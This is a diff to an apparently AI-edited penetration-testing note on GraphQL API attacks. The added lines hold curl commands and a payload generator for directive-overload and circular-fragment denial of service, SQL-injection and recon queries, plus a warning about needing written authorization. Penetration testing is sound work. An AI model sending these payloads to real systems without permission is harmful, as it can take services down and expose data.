@@ -1,12 +1,10 @@
 # GraphQL Attacks
 
-#GraphQL #APIAttacks #Injection #WebAppAttacks
-
+#GraphQL #APIAttacks #Injection #WebAppAttacks #Introspection #BOLA #DoS #graphw00f #clairvoyance #graphqlmap #BurpSuite
 
 ## What is this?
 
-GraphQL API attack techniques — introspection enumeration, batching abuse, injection via queries/mutations, and auth bypass. Single endpoint makes recon and exploitation differ from REST. Pairs with [[API Attacks]], [[Web Fuzzing]].
-
+GraphQL API attack techniques — introspection enumeration, batching abuse, injection via queries/mutations, and auth bypass. Single endpoint makes recon and exploitation differ from REST. Pairs with [[API Attacks]], [[Fuzzing]], [[Web Fuzzing]].
 
 ---
 
@@ -14,13 +12,14 @@ GraphQL API attack techniques — introspection enumeration, batching abuse, inj
 
 | Tool | Purpose |
 |---|---|
-| `Burp Suite` | Intercept GraphQL requests, modify queries/mutations, test auth bypass |
-| `InQL` | Burp extension — introspection, schema visualization, automated query generation (BApp Store) |
-| `GraphQL Voyager` | Visual schema explorer from introspection JSON |
-| `graphw00f` | GraphQL fingerprinting — identify engine (Apollo, Hasura, etc.) — `git clone https://github.com/dolevf/graphw00f` |
-| `clairvoyance` | Schema inference when introspection is disabled (needs a wordlist) — `pip3 install clairvoyance` |
-| `graphqlmap` | Automated GraphQL exploitation — `git clone https://github.com/swisskyrepo/GraphQLmap` |
-| `curl` | Manual query/mutation testing |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept GraphQL requests, modify queries/mutations, test auth bypass |
+| [InQL](https://github.com/doyensec/inql) | Burp extension — introspection, schema visualization, automated query generation (BApp Store) |
+| [GraphQL Voyager](https://ivangoncharov.github.io/graphql-voyager/) | Visual schema explorer from introspection JSON |
+| [[Tools/Web/graphw00f\|graphw00f]] | GraphQL fingerprinting — identify engine (Apollo, Hasura, etc.) |
+| [[Tools/Web/clairvoyance\|clairvoyance]] | Schema inference when introspection is disabled (needs a wordlist) |
+| [[Tools/Web/graphqlmap\|graphqlmap]] | Automated GraphQL exploitation — introspection, injection, dumping |
+| [[Tools/Web/graphql-cop\|graphql-cop]] | Fast security audit — flags introspection, batching, field suggestions, DoS guards |
+| [[Tools/File Transfer/cURL\|curl]] | Manual query/mutation testing |
 
 ---
 
@@ -299,6 +298,20 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d
 # Field duplication (if no complexity limit)
 curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user { id id id id id id id id id id id id id id id id id id id id } }"}'
 
+# Directive overload (CVE-2024-47614) — undefined directives still get parsed and
+# error-handled, so response size and processing time climb with each one
+python3 -c "print('{\"query\":\"{ __typename ' + '@a @b @c @d @e @r @s @a @f @d '*100 + '}\"}')" > dirbomb.json
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d @dirbomb.json -o /dev/null -w "time=%{time_total}s size=%{size_download}\n"
+# Compare against a baseline query — a large jump means limit_directives isn't set
+
+# Recursive / circular fragments — expand during query planning
+# (Apollo Router CVE-2025-32032; Hot Chocolate CVE-2026-40324 hit a stack overflow at ~40 KB)
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
+  "query": "fragment A on User { ...B } fragment B on User { ...A } { user { ...A } }"
+}'
+# A spec-compliant server rejects this at validation ("Cannot spread fragment A within itself").
+# A hang, 500, or stack-trace instead means the cycle check is missing → DoS primitive.
+
 # Introspection DoS — if server doesn't cache schema resolution
 curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { fields { type { fields { type { fields { name } } } } } } } }"}'
 
@@ -324,6 +337,10 @@ for t in threads: t.start()
 for t in threads: t.join()
 EOF
 ```
+
+> [!warning] Every technique in this section degrades or drops the service. None of them belong in an engagement without explicit written authorization for DoS testing — which most scopes exclude. The safe version is to **confirm the guard is missing** (one directive-overload request, timed against a baseline; one circular fragment checked for a validation error) and report the absent limit, rather than actually exhausting the target.
+
+> [!note] **Reverse direction — CVE-2025-27407.** The Ruby `graphql` gem is vulnerable to RCE when *loading* an attacker-controlled schema via `GraphQL::Schema.from_introspection` or `Schema::Loader.load`. Worth remembering when the target is a client, gateway, or dev tool that ingests introspection JSON you can supply — the usual attacker/victim roles flip.
 
 ---
 
@@ -379,10 +396,23 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d
 
 # SQLi test
 curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(id: \"1 OR 1=1-- -\") { id username } }"}'
+
+# Fingerprint the engine (determines which bypasses are worth trying)
+python3 main.py -f -t http://<target>/graphql          # graphw00f
+
+# One-shot security audit — introspection, batching, suggestions, missing DoS guards
+graphql-cop -t http://<target>/graphql
+
+# Introspection disabled? recover the schema from field suggestions
+clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt "http://<target>/graphql"
+
+# Circular-fragment guard check (expect a validation error, not a hang)
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"fragment A on User { ...B } fragment B on User { ...A } { user { ...A } }"}'
 ```
 
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-30*
+*Model: claude-opus-5*
